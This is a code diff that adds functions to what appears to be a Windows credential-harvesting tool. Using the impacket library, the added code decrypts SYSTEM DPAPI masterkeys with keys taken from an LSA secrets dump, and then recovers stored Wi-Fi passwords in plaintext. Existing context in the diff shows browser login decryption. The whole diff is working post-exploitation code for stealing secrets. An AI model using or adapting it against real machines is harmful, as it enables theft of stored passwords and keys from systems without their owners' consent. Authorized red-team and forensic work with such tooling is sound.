@@ -253,3 +253,81 @@ def decrypt_browser_login(blob, aes_key):
         return cipher.decrypt_and_verify(ct[:-16], ct[-16:])
     except ValueError:
         return None
+
+
+# -- system-scope triage (stage 5) ------------------------------------------
+
+
+def decrypt_system_masterkey_file(data, dpapi_system):
+    """(guid, masterkey) out of a SYSTEM-context MasterKeyFile blob,
+    decrypted with the DPAPI_SYSTEM keys from LSA secrets — the
+    password-path PBKDF2/HMAC decryption (no RSA anywhere on this path,
+    unlike the domain-user chain). Tries the user key and the machine
+    key against both the MasterKey and BackupKey blobs, the way
+    impacket's dpapi.py example does. (None, None) when nothing fits."""
+    from impacket import dpapi
+    mkf = dpapi.MasterKeyFile(data)
+    if mkf["MasterKeyLen"] <= 0:
+        return None, None
+    offset = len(mkf)
+    mk = dpapi.MasterKey(data[offset:offset + mkf["MasterKeyLen"]])
+    offset += mkf["MasterKeyLen"]
+    bkmk = None
+    if mkf["BackupKeyLen"] > 0:
+        bkmk = dpapi.MasterKey(data[offset:offset + mkf["BackupKeyLen"]])
+    guid = mkf["Guid"].decode("utf-16-le").rstrip("\x00")
+    candidates = [mk] + ([bkmk] if bkmk is not None else [])
+    for key in (dpapi_system.get("UserKey"), dpapi_system.get("MachineKey")):
+        if key is None:
+            continue
+        for blob in candidates:
+            masterkey = blob.decrypt(key)
+            if masterkey is not None:
+                return guid, masterkey
+    return guid, None
+
+
+def parse_dpapi_system(secrets):
+    """{MachineKey, UserKey} bytes out of LSASecrets output lines —
+    they arrive as 'dpapi_machinekey:0x...' / 'dpapi_userkey:0x...'
+    (dploot's parsing, proven against the same dump)."""
+    keys = {}
+    for secret in secrets:
+        for line in secret.splitlines():
+            for name, slot in (("dpapi_machinekey", "MachineKey"),
+                               ("dpapi_userkey", "UserKey")):
+                if line.startswith(name + ":"):
+                    keys[slot] = bytes.fromhex(line.split(":", 1)[1][2:])
+    return keys
+
+
+def wifi_passwords(xml_bytes, masterkeys):
+    """(ssid, plaintext) out of a Wlansvc profile XML: <keyMaterial>
+    is a hexed DPAPI blob under the SYSTEM masterkey, matched by
+    GuidMasterKey. Skips open networks (no keyMaterial) and returns
+    None for a blob no key fits."""
+    import xml.etree.ElementTree as ET
+    from impacket import dpapi
+    from impacket.uuid import bin_to_string
+    try:
+        root = ET.fromstring(xml_bytes.decode("utf-8", "replace"))
+    except ET.ParseError:
+        return None, None
+    ns = "{http://www.microsoft.com/networking/WLAN/profile/v1}"
+    name_el = root.find(f".//{ns}name")
+    ssid = name_el.text if name_el is not None else "?"
+    key_el = root.find(f".//{ns}keyMaterial")
+    if key_el is None or not key_el.text:
+        return ssid, None
+    blob = dpapi.DPAPI_BLOB(bytes.fromhex(key_el.text.strip()))
+    guid = bin_to_string(blob["GuidMasterKey"]).lower()
+    key = masterkeys.get(guid)
+    if key is None:
+        return ssid, None
+    try:
+        plain = blob.decrypt(key)
+    except ValueError:
+        return ssid, None
+    if plain is None:
+        return ssid, None
+    return ssid, plain.decode("utf-8", "replace").rstrip("\x00")
